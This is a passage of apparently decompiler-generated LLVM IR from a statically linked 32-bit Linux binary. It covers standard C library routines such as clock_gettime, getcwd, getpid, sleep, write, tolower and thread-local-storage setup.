dec_label_pc_804efd6:                             ; preds = %dec_label_pc_804efd6.loopexit, %dec_label_pc_804efcf
  %v2_804efda = load i32, i32* %v1_804efc7, align 4
  %v3_804efda = add i32 %v2_804efda, 1
  store i32 %v3_804efda, i32* %v1_804efc7, align 4
  %v0_804f00327.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f003.preheader

dec_label_pc_804f003.preheader:                   ; preds = %dec_label_pc_804efd6, %dec_label_pc_804efcf
  %v0_804f00327 = phi i32 [ %v0_804f00327.pre, %dec_label_pc_804efd6 ], [ %tmp19, %dec_label_pc_804efcf ]
  %v1_804f00328 = inttoptr i32 %v0_804f00327 to i32*
  %v2_804f00329 = load i32, i32* %v1_804f00328, align 4
  store i32 %v2_804f00329, i32* @edi, align 4
  %v15_804f00631 = icmp eq i32 %v2_804f00329, %arg3
  br i1 %v15_804f00631, label %dec_label_pc_804efdf, label %dec_label_pc_804f00c

dec_label_pc_804efdf:                             ; preds = %dec_label_pc_804f003.preheader, %dec_label_pc_804f003.backedge
  %v0_804f00333 = phi i32 [ %v0_804f003, %dec_label_pc_804f003.backedge ], [ %v0_804f00327, %dec_label_pc_804f003.preheader ]
  store i32 240, i32* @eax, align 4
  store i32 %v0_804f00333, i32* @edx, align 4
  %v1_804efea = call i32 @__vsyscall(i32 %v0_804ef8f)
  %v10_804efef = icmp eq i32 %v1_804efea, -38
  store i32 %v1_804efea, i32* %stack_var_-20, align 4
  %v1_804eff5 = icmp eq i1 %v10_804efef, false
  br i1 %v1_804eff5, label %dec_label_pc_804f003.backedge, label %dec_label_pc_804eff7

dec_label_pc_804eff7:                             ; preds = %dec_label_pc_804efdf
  store i32 240, i32* @eax, align 4
  %v1_804effe = call i32 @__vsyscall(i32 %v1_804efea)
  br label %dec_label_pc_804f003.backedge

dec_label_pc_804f003.backedge:                    ; preds = %dec_label_pc_804eff7, %dec_label_pc_804efdf
  %v0_804f003 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f003 = inttoptr i32 %v0_804f003 to i32*
  %v2_804f003 = load i32, i32* %v1_804f003, align 4
  store i32 %v2_804f003, i32* @edi, align 4
  %v15_804f006 = icmp eq i32 %v2_804f003, %arg3
  br i1 %v15_804f006, label %dec_label_pc_804efdf, label %dec_label_pc_804f00c

dec_label_pc_804f00c:                             ; preds = %dec_label_pc_804f003.backedge, %dec_label_pc_804f003.preheader
  br i1 %v4_804efcf, label %dec_label_pc_804f01a, label %dec_label_pc_804f013

dec_label_pc_804f013:                             ; preds = %dec_label_pc_804f00c
  %v2_804f017 = load i32, i32* %v1_804efc7, align 4
  %v3_804f017 = add i32 %v2_804f017, -1
  store i32 %v3_804f017, i32* %v1_804efc7, align 4
  br label %dec_label_pc_804f01a

dec_label_pc_804f01a.loopexit:                    ; preds = %dec_label_pc_804efab
  br label %dec_label_pc_804f01a

dec_label_pc_804f01a:                             ; preds = %dec_label_pc_804f01a.loopexit, %dec_label_pc_804f00c, %dec_label_pc_804f013
  %v2_804f01a = load i32, i32* %stack_var_-20, align 4
  store i32 %v0_804ef8f, i32* @ebx, align 4
  store i32 %v0_804ef8d, i32* @edi, align 4
  ret i32 %v2_804f01a

; uselistorder directives
  uselistorder i32 %v0_804f003, { 1, 0 }
  uselistorder i32 %v1_804efea, { 1, 2, 0 }
  uselistorder i32 %v0_804efb6, { 1, 0 }
  uselistorder i1 %v4_804efcf, { 1, 0, 2 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 %arg3, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f01a, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804efdf, { 1, 0 }
  uselistorder label %dec_label_pc_804efa4, { 1, 0 }
}

define i32 @dummy.7(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804f020 = load i32, i32* @eax, align 4
  ret i32 %v0_804f020
}

define i32 @_pthread_cleanup_push() local_unnamed_addr {
entry:
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @eax, align 4
  %v2_804f029 = inttoptr i32 %tmp2 to i32*
  %v1_804f02f = load i32, i32* @eax, align 4
  %v2_804f02f = add i32 %v1_804f02f, 4
  %v3_804f02f = inttoptr i32 %v2_804f02f to i32*
  %v1_804f032 = call i32 @dummy.7(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_804f032
}

define i32 @_pthread_cleanup_pop() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp4, i32* %stack_var_-12, align 4
  %v0_804f037 = load i32, i32* @esi, align 4
  store i32 %tmp2, i32* %esi.global-to-local, align 4
  %v1_804f045 = call i32 @dummy.7(i32 %tmp2)
  %v1_804f04d = icmp eq i32 %tmp, 0
  br i1 %v1_804f04d, label %entry.dec_label_pc_804f05f_crit_edge, label %dec_label_pc_804f051

entry.dec_label_pc_804f05f_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804f05f

dec_label_pc_804f051:                             ; preds = %entry
  %v0_804f051 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f058 = inttoptr i32 %v0_804f051 to i32*
  %v2_804f058 = load i32, i32* %v1_804f058, align 4
  store i32 %v2_804f058, i32* @ecx, align 4
  store i32 %v0_804f037, i32* %esi.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_804f058)
  %v2_804f05f.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804f05f

dec_label_pc_804f05f:                             ; preds = %entry.dec_label_pc_804f05f_crit_edge, %dec_label_pc_804f051
  %v2_804f05f = phi i32 [ %tmp4, %entry.dec_label_pc_804f05f_crit_edge ], [ %v2_804f05f.pre, %dec_label_pc_804f051 ]
  store i32 %v0_804f037, i32* %esi.global-to-local, align 4
  ret i32 %v2_804f05f

; uselistorder directives
  uselistorder i32 %v0_804f037, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder label %dec_label_pc_804f05f, { 1, 0 }
}

define i32 @__pthread_setcancelstate(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp1 = ptrtoint i32* %arg2 to i32
  %v0_804f064 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %tmp1, i32* @ecx, align 4
  %v6_804f075 = icmp ugt i32 %arg1, 2
  br i1 %v6_804f075, label %dec_label_pc_804f08c, label %dec_label_pc_804f077

dec_label_pc_804f077:                             ; preds = %entry
  call void @llvm.trap()
  unreachable

dec_label_pc_804f08c:                             ; preds = %entry
  store i32 %v0_804f064, i32* @ebx, align 4
  ret i32 22
}

define i32 @pthread_sigmask(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg3 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_804f090 = load i32, i32* @edi, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v0_804f096 = load i32, i32* @esi, align 4
  store i32 %v0_804f096, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edx, align 4
  store i32 %tmp2, i32* @edi, align 4
  %v6_804f0a6 = icmp ugt i32 %arg1, 2
  br i1 %v6_804f0a6, label %dec_label_pc_804f0c6, label %dec_label_pc_804f0a8

dec_label_pc_804f0a8:                             ; preds = %entry
  store i32 175, i32* @eax, align 4
  %v1_804f0af = call i32 @__vsyscall(i32 %v0_804f096)
  %v1_804f0b4 = sub i32 0, %v1_804f0af
  %v6_804f0b4 = icmp eq i32 %v1_804f0af, 0
  store i32 %v1_804f0b4, i32* %eax.global-to-local, align 4
  %v1_804f0b6 = icmp eq i1 %v6_804f0b4, false
  br i1 %v1_804f0b6, label %dec_label_pc_804f0c6, label %dec_label_pc_804f0b8

dec_label_pc_804f0b8:                             ; preds = %dec_label_pc_804f0a8
  %v1_804f0b8 = icmp eq i32* %arg3, null
  br i1 %v1_804f0b8, label %dec_label_pc_804f0c6, label %dec_label_pc_804f0bc

dec_label_pc_804f0bc:                             ; preds = %dec_label_pc_804f0b8
  %v2_804f0bc = load i32, i32* %arg3, align 4
  %v3_804f0bc = urem i32 %v2_804f0bc, -2147483648
  store i32 %v3_804f0bc, i32* %arg3, align 4
  %v1_804f0c2 = add i32 %tmp2, 4
  %v2_804f0c2 = inttoptr i32 %v1_804f0c2 to i32*
  %v3_804f0c2 = load i32, i32* %v2_804f0c2, align 4
  %v4_804f0c2 = and i32 %v3_804f0c2, -4
  store i32 %v4_804f0c2, i32* %v2_804f0c2, align 4
  %v0_804f0c8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f0c6

dec_label_pc_804f0c6:                             ; preds = %entry, %dec_label_pc_804f0b8, %dec_label_pc_804f0a8, %dec_label_pc_804f0bc
  %v0_804f0c8 = phi i32 [ 22, %entry ], [ %v1_804f0b4, %dec_label_pc_804f0b8 ], [ %v1_804f0b4, %dec_label_pc_804f0a8 ], [ %v0_804f0c8.pre, %dec_label_pc_804f0bc ]
  %v2_804f0c6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f0c6, i32* @esi, align 4
  store i32 %v0_804f090, i32* @edi, align 4
  ret i32 %v0_804f0c8

; uselistorder directives
  uselistorder i32 %v1_804f0af, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 0 }
  uselistorder i32 175, { 0, 4, 2, 3, 1 }
  uselistorder label %dec_label_pc_804f0c6, { 3, 1, 2, 0 }
}

define i32 @dummy.8() local_unnamed_addr {
entry:
  %v0_804f0cc = load i32, i32* @eax, align 4
  ret i32 %v0_804f0cc
}

define i32 @__pthread_testcancel(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804f0cd = call i32 @dummy.8()
  ret i32 %v0_804f0cd
}

define i32 @__clock_gettime(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804f0d4 = load i32, i32* @edi, align 4
  %v0_804f0d5 = load i32, i32* @esi, align 4
  %v0_804f0da = load i32, i32* @global_var_8056e00.373, align 512
  store i32 %arg1, i32* @edi, align 4
  %v1_804f0e8 = icmp eq i32 %v0_804f0da, 0
  %v1_804f0ea = icmp eq i1 %v1_804f0e8, false
  br i1 %v1_804f0ea, label %dec_label_pc_804f115, label %dec_label_pc_804f0ec

dec_label_pc_804f0ec:                             ; preds = %entry
  %v0_804f0ec = load i32, i32* @eax, align 4
  %v7_804f0f8 = call i32 @__vdsosym(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80545d1.375, i32 0, i32 0), i32 ptrtoint ([21 x i8]* @global_var_80545bc.374 to i32), i32 %v0_804f0ec, i32 %v0_804f0ec)
  %v1_804f100 = icmp eq i32 %v7_804f0f8, 0
  %v1_804f104 = icmp eq i1 %v1_804f100, false
  %v0_804f102. = select i1 %v1_804f104, i32 %v7_804f0f8, i32 134541611
  store i32 %v0_804f102., i32* @edx, align 4
  %v0_804f10d = load i32, i32* @global_var_8056e00.373, align 512
  %v13_804f10d = icmp eq i32 %v0_804f0da, %v0_804f10d
  %v20_804f10d = select i1 %v13_804f10d, i32 %v0_804f102., i32 %v0_804f10d
  store i32 %v20_804f10d, i32* @global_var_8056e00.373, align 512
  %v0_804f11f.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f115

dec_label_pc_804f115:                             ; preds = %entry, %dec_label_pc_804f0ec
  %v0_804f11f = phi i32 [ %arg1, %entry ], [ %v0_804f11f.pre, %dec_label_pc_804f0ec ]
  %v0_804f115 = phi i32 [ %v0_804f0da, %entry ], [ %v20_804f10d, %dec_label_pc_804f0ec ]
  store i32 %v0_804f115, i32* @ecx, align 4
  store i32 %v0_804f0d5, i32* @esi, align 4
  store i32 %v0_804f0d4, i32* @edi, align 4
  %v1_804f129 = call i32 @unknown_0(i32 %v0_804f11f)
  ret i32 %v1_804f129

; uselistorder directives
  uselistorder i32 %v0_804f10d, { 1, 0 }
  uselistorder i32 %v0_804f0da, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f115, { 1, 0 }
}

define i32 @sc_clock_gettime(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 265, i32* @eax, align 4
  %v0_804f131 = load i32, i32* @ebx, align 4
  store i32 %v0_804f131, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_804f13f = call i32 @__vsyscall(i32 %v0_804f131)
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804f146 = icmp eq i32 %v1_804f13f, 0
  br i1 %v1_804f146, label %dec_label_pc_804f184, label %dec_label_pc_804f14a

dec_label_pc_804f14a:                             ; preds = %entry
  %v10_804f14a = icmp eq i32 %v1_804f13f, -38
  %v1_804f14d = icmp eq i1 %v10_804f14a, false
  br i1 %v1_804f14d, label %dec_label_pc_804f176, label %dec_label_pc_804f14f

dec_label_pc_804f14f:                             ; preds = %dec_label_pc_804f14a
  %v1_804f14f = icmp eq i32 %arg1, 0
  store i32 -22, i32* @ebx, align 4
  %v1_804f156 = icmp eq i1 %v1_804f14f, false
  br i1 %v1_804f156, label %dec_label_pc_804f178, label %dec_label_pc_804f158

dec_label_pc_804f158:                             ; preds = %dec_label_pc_804f14f
  store i32 78, i32* @eax, align 4
  %v0_804f15d = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804f15d, i32* @edx, align 4
  %v0_804f163 = load i32, i32* %stack_var_-8, align 4
  %v1_804f163 = call i32 @__vsyscall(i32 %v0_804f163)
  %v2_804f168 = add i32 %v0_804f15d, 4
  %v3_804f168 = inttoptr i32 %v2_804f168 to i32*
  %v4_804f168 = load i32, i32* %v3_804f168, align 4
  %v6_804f168 = mul i32 %v4_804f168, 1000
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %v6_804f168, i32* %v3_804f168, align 4
  %v0_804f184.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f184

dec_label_pc_804f176:                             ; preds = %dec_label_pc_804f14a
  store i32 %v1_804f13f, i32* @ebx, align 4
  br label %dec_label_pc_804f178

dec_label_pc_804f178:                             ; preds = %dec_label_pc_804f14f, %dec_label_pc_804f176
  %v0_804f178 = load i32, i32* %stack_var_-8, align 4
  %v1_804f178 = call i32 @__errno_location(i32 %v0_804f178)
  %v0_804f17d = load i32, i32* @ebx, align 4
  %v1_804f17d = sub i32 0, %v0_804f17d
  %v2_804f17f = inttoptr i32 %v1_804f178 to i32*
  store i32 %v1_804f17d, i32* %v2_804f17f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f184

dec_label_pc_804f184:                             ; preds = %entry, %dec_label_pc_804f158, %dec_label_pc_804f178
  %v0_804f184 = phi i32 [ 0, %entry ], [ %v0_804f184.pre, %dec_label_pc_804f158 ], [ -1, %dec_label_pc_804f178 ]
  %v2_804f187 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f187, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f184

; uselistorder directives
  uselistorder i32 %v1_804f13f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 2, 1, 0, 3 }
  uselistorder i32 1000, { 1, 0 }
  uselistorder label %dec_label_pc_804f184, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f178, { 1, 0 }
}

define i32 @time(i32* %arg1) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f18c = load i32, i32* @ebx, align 4
  store i32 %v0_804f18c, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* @ebx, align 4
  %v2_804f194 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_804f194, i32* @eax, align 4
  %v2_804f19b = call i32 @__clock_gettime(i32 0, i32 %v2_804f194)
  %v1_804f1a3 = icmp eq i32* %arg1, null
  %v3_804f1ad.pre = load i32, i32* %stack_var_-12, align 4
  br i1 %v1_804f1a3, label %dec_label_pc_804f1ad, label %dec_label_pc_804f1a7

dec_label_pc_804f1a7:                             ; preds = %entry
  store i32 %v3_804f1ad.pre, i32* %arg1, align 4
  br label %dec_label_pc_804f1ad

dec_label_pc_804f1ad:                             ; preds = %entry, %dec_label_pc_804f1a7
  %v2_804f1b4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f1b4, i32* @ebx, align 4
  ret i32 %v3_804f1ad.pre

; uselistorder directives
  uselistorder i32 (i32, i32)* @__clock_gettime, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f1ad, { 1, 0 }
}

define i32 @dummy.9(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @close(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f1c4 = call i32 @dummy.5(i32 %arg1)
  %v7_804f1d9 = call i32 @__syscall_cp(i32 6, i32 %v1_804f1c4, i32 0, i32 0, i32 0, i32 0, i32 0)
  %v10_804f1e3 = icmp eq i32 %v7_804f1d9, -4
  br i1 %v10_804f1e3, label %dec_label_pc_804f1ea, label %dec_label_pc_804f1e8

dec_label_pc_804f1e8:                             ; preds = %entry
  br label %dec_label_pc_804f1ea

dec_label_pc_804f1ea:                             ; preds = %entry, %dec_label_pc_804f1e8
  %v0_804f1ea = phi i32 [ 0, %entry ], [ %v7_804f1d9, %dec_label_pc_804f1e8 ]
  %v1_804f1f1 = call i32 @__syscall_ret(i32 %v0_804f1ea)
  ret i32 %v1_804f1f1

; uselistorder directives
  uselistorder i32 %v7_804f1d9, { 1, 0 }
  uselistorder label %dec_label_pc_804f1ea, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4100 = alloca i32, align 4
  %v0_804f1f8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f20d = icmp eq i32 %arg1, 0
  br i1 %v1_804f20d, label %dec_label_pc_804f222, label %dec_label_pc_804f211

dec_label_pc_804f211:                             ; preds = %entry
  %v1_804f211 = icmp eq i32 %arg2, 0
  %v1_804f213 = icmp eq i1 %v1_804f211, false
  br i1 %v1_804f213, label %dec_label_pc_804f22b, label %dec_label_pc_804f215

dec_label_pc_804f215:                             ; preds = %dec_label_pc_804f211
  %v1_804f215 = call i32 @__errno_location(i32 %v0_804f1f8)
  %v1_804f21a = inttoptr i32 %v1_804f215 to i32*
  store i32 22, i32* %v1_804f21a, align 4
  br label %dec_label_pc_804f247

dec_label_pc_804f222:                             ; preds = %entry
  %v2_804f222 = ptrtoint i32* %stack_var_-4100 to i32
  store i32 %v2_804f222, i32* @ebx, align 4
  br label %dec_label_pc_804f22b

dec_label_pc_804f22b:                             ; preds = %dec_label_pc_804f211, %dec_label_pc_804f222
  %v0_804f230 = phi i32 [ %arg1, %dec_label_pc_804f211 ], [ %v2_804f222, %dec_label_pc_804f222 ]
  store i32 183, i32* @eax, align 4
  store i32 %v0_804f230, i32* @edx, align 4
  %v1_804f232 = call i32 @__vsyscall(i32 %v0_804f1f8)
  %v1_804f23b = call i32 @__syscall_ret(i32 %v1_804f232)
  %v2_804f243 = icmp slt i32 %v1_804f23b, 0
  %v1_804f245 = icmp eq i1 %v2_804f243, false
  br i1 %v1_804f245, label %dec_label_pc_804f24b, label %dec_label_pc_804f247

dec_label_pc_804f247:                             ; preds = %dec_label_pc_804f22b, %dec_label_pc_804f215
  br label %dec_label_pc_804f261

dec_label_pc_804f24b:                             ; preds = %dec_label_pc_804f22b
  %v2_804f24b = ptrtoint i32* %stack_var_-4100 to i32
  %v0_804f24f = load i32, i32* @ebx, align 4
  %v12_804f24f = icmp eq i32 %v0_804f24f, %v2_804f24b
  %v1_804f251 = icmp eq i1 %v12_804f24f, false
  br i1 %v1_804f251, label %dec_label_pc_804f261, label %dec_label_pc_804f253

dec_label_pc_804f253:                             ; preds = %dec_label_pc_804f24b
  %v1_804f257 = inttoptr i32 %v0_804f24f to i8*
  %v2_804f257 = call i32 @__strdup(i8* %v1_804f257)
  br label %dec_label_pc_804f261

dec_label_pc_804f261:                             ; preds = %dec_label_pc_804f24b, %dec_label_pc_804f247, %dec_label_pc_804f253
  %v0_804f261 = phi i32 [ %v0_804f24f, %dec_label_pc_804f24b ], [ 0, %dec_label_pc_804f247 ], [ %v2_804f257, %dec_label_pc_804f253 ]
  store i32 %v0_804f1f8, i32* @ebx, align 4
  ret i32 %v0_804f261

; uselistorder directives
  uselistorder i32 %v0_804f24f, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f261, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f22b, { 1, 0 }
}

define i32 @getpid() local_unnamed_addr {
entry:
  store i32 20, i32* @eax, align 4
  %v1_804f271 = call i32 @__vsyscall(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_804f271
}

define i32 @getppid() local_unnamed_addr {
entry:
  store i32 64, i32* @eax, align 4
  %v1_804f27d = call i32 @__vsyscall(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_804f27d
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_804f297 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804f29d = call i32 @nanosleep(i32 %v2_804f297, i32 %v2_804f297)
  %v1_804f2a7 = icmp eq i32 %v2_804f29d, 0
  br i1 %v1_804f2a7, label %dec_label_pc_804f2af, label %dec_label_pc_804f2ab

dec_label_pc_804f2ab:                             ; preds = %entry
  %v3_804f2ab = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804f2af

dec_label_pc_804f2af:                             ; preds = %entry, %dec_label_pc_804f2ab
  %v0_804f2af = phi i32 [ 0, %entry ], [ %v3_804f2ab, %dec_label_pc_804f2ab ]
  ret i32 %v0_804f2af

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f2af, { 1, 0 }
}

define i32 @write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v7_804f2cf = call i32 @__syscall_cp(i32 4, i32 %arg1, i32 %arg2, i32 %arg3, i32 0, i32 0, i32 0)
  %v1_804f2db = call i32 @__syscall_ret(i32 %v7_804f2cf)
  ret i32 %v1_804f2db
}

define i32 @isalnum(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f2eb = or i32 %arg1, 32
  %v1_804f2ee = add i32 %v1_804f2eb, -97
  %tmp = icmp ult i32 %v1_804f2ee, 26
  br i1 %tmp, label %dec_label_pc_804f301, label %dec_label_pc_804f2f6

dec_label_pc_804f2f6:                             ; preds = %entry
  %v1_804f2f6 = add i32 %arg1, -48
  %tmp2 = icmp ult i32 %v1_804f2f6, 10
  %v3_804f2fe = zext i1 %tmp2 to i32
  br label %dec_label_pc_804f301

dec_label_pc_804f301:                             ; preds = %entry, %dec_label_pc_804f2f6
  %v0_804f301 = phi i32 [ 1, %entry ], [ %v3_804f2fe, %dec_label_pc_804f2f6 ]
  ret i32 %v0_804f301

; uselistorder directives
  uselistorder i32 26, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f301, { 1, 0 }
}

define i32 @__isalnum_l(i32 %c) local_unnamed_addr {
entry:
  %v1_804f304 = call i32 @isalnum(i32 %c)
  ret i32 %v1_804f304

; uselistorder directives
  uselistorder i32 (i32)* @isalnum, { 1, 0 }
}

define i32 @tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f310 = add i32 %arg1, -65
  %v6_804f316 = icmp ugt i32 %v1_804f310, 25
  br i1 %v6_804f316, label %dec_label_pc_804f31b, label %dec_label_pc_804f318

dec_label_pc_804f318:                             ; preds = %entry
  %v1_804f318 = or i32 %arg1, 32
  br label %dec_label_pc_804f31b

dec_label_pc_804f31b:                             ; preds = %entry, %dec_label_pc_804f318
  %v0_804f31b = phi i32 [ %arg1, %entry ], [ %v1_804f318, %dec_label_pc_804f318 ]
  ret i32 %v0_804f31b

; uselistorder directives
  uselistorder label %dec_label_pc_804f31b, { 1, 0 }
}

define i32 @__tolower_l(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f322 = add i32 %arg1, -65
  %v6_804f328 = icmp ugt i32 %v1_804f322, 25
  br i1 %v6_804f328, label %dec_label_pc_804f32d, label %dec_label_pc_804f32a

dec_label_pc_804f32a:                             ; preds = %entry
  %v1_804f32a = or i32 %arg1, 32
  br label %dec_label_pc_804f32d

dec_label_pc_804f32d:                             ; preds = %entry, %dec_label_pc_804f32a
  %v0_804f32d = phi i32 [ %arg1, %entry ], [ %v1_804f32a, %dec_label_pc_804f32a ]
  ret i32 %v0_804f32d

; uselistorder directives
  uselistorder label %dec_label_pc_804f32d, { 1, 0 }
}

define i32 @__copy_tls(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  store i32 %tmp5, i32* %edx.global-to-local, align 4
  %v0_804f338 = load i32, i32* @global_var_8056fbc.376, align 4
  %v1_804f338 = icmp eq i32 %v0_804f338, 0
  store i32 %tmp5, i32* %eax.global-to-local, align 4
  br i1 %v1_804f338, label %dec_label_pc_804f38c, label %dec_label_pc_804f343

dec_label_pc_804f343:                             ; preds = %entry
  %v0_804f343 = load i32, i32* @global_var_8056fc8.377, align 8
  store i32 %v0_804f343, i32* %ebx.global-to-local, align 4
  %v1_804f349 = add i32 %tmp5, -212
  %v1_804f34f = load i32, i32* @global_var_8056f94.378, align 4
  %v2_804f34f = add i32 %v1_804f349, %v1_804f34f
  store i32 %v2_804f34f, i32* %eax.global-to-local, align 4
  store i32 1, i32* %arg1, align 4
  %v5_804f35b = sub i32 0, %v0_804f343
  %v2_804f35e = and i32 %v2_804f34f, %v5_804f35b
  store i32 %v2_804f35e, i32* %ebx.global-to-local, align 4
  %v1_804f362 = load i32, i32* @global_var_8056fc4.379, align 4
  %v2_804f362 = sub i32 %v2_804f35e, %v1_804f362
  store i32 %v2_804f362, i32* %eax.global-to-local, align 4
  %v0_804f368 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f368 = add i32 %v2_804f35e, 208
  %v3_804f368 = inttoptr i32 %v2_804f368 to i32*
  store i32 %v0_804f368, i32* %v3_804f368, align 4
  %v0_804f36e = load i32, i32* %edx.global-to-local, align 4
  %v1_804f36e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f36e = add i32 %v1_804f36e, 4
  %v3_804f36e = inttoptr i32 %v2_804f36e to i32*
  store i32 %v0_804f36e, i32* %v3_804f36e, align 4
  %v0_804f371 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f371 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f371 = add i32 %v1_804f371, 4
  %v3_804f371 = inttoptr i32 %v2_804f371 to i32*
  store i32 %v0_804f371, i32* %v3_804f371, align 4
  %v0_804f375 = load i32, i32* @global_var_8056fc0.380, align 64
  %v0_804f37b = load i32, i32* @global_var_8056fbc.376, align 4
  %v0_804f381 = load i32, i32* %eax.global-to-local, align 4
  %v3_804f382 = inttoptr i32 %v0_804f381 to i8*
  %v4_804f382 = call i32 @memcpy(i8* %v3_804f382, i32 %v0_804f37b, i32 %v0_804f375)
  %v0_804f387 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f387, i32* %eax.global-to-local, align 4
  %v2_804f38c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804f38c

dec_label_pc_804f38c:                             ; preds = %entry, %dec_label_pc_804f343
  %v0_804f38f = phi i32 [ %tmp5, %entry ], [ %v0_804f387, %dec_label_pc_804f343 ]
  %v2_804f38c = phi i32 [ %tmp12, %entry ], [ %v2_804f38c.pre, %dec_label_pc_804f343 ]
  store i32 %v2_804f38c, i32* %edx.global-to-local, align 4
  ret i32 %v0_804f38f

; uselistorder directives
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder label %dec_label_pc_804f38c, { 1, 0 }
}

define i32 @__init_tls(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_804f390 = load i32, i32* @ebp, align 4
  %v0_804f395 = load i32, i32* @ebx, align 4
  %v1_804f39f = add i32 %arg1, 12
  %v2_804f39f = inttoptr i32 %v1_804f39f to i32*
  %v3_804f39f = load i32, i32* %v2_804f39f, align 4
  %v1_804f3a2 = add i32 %arg1, 20
  %v2_804f3a2 = inttoptr i32 %v1_804f3a2 to i32*
  %v3_804f3a2 = load i32, i32* %v2_804f3a2, align 4
  store i32 %v3_804f39f, i32* @edi, align 4
  %v1_804f3c22 = icmp eq i32 %v3_804f3a2, 0
  %v1_804f3c49 = icmp eq i1 %v1_804f3c22, false
  br i1 %v1_804f3c49, label %dec_label_pc_804f3a9.preheader, label %dec_label_pc_804f3c6.thread

